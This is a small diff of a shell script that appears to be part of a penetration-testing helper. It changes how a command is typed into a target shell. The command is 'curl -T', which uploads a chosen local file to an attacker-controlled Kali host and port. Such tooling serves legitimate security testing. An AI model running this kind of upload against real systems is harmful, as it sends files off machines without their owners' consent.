@@ -16,5 +16,5 @@ UPLOAD_PORT=${form_data["port"]}
 LOCAL_FILE_LOCATION=${form_data["local_file"]}
 REMOTE_FILE_LOCATION=${form_data["upload_location"]}
 
-paste_command "curl -T ${LOCAL_FILE_LOCATION} http://${KALI_IP}:${UPLOAD_PORT}/${REMOTE_FILE_LOCATION}"
-xdotool key Return
+execute_command "curl -T ${LOCAL_FILE_LOCATION} http://${KALI_IP}:${UPLOAD_PORT}/${REMOTE_FILE_LOCATION}"
+create_new_line
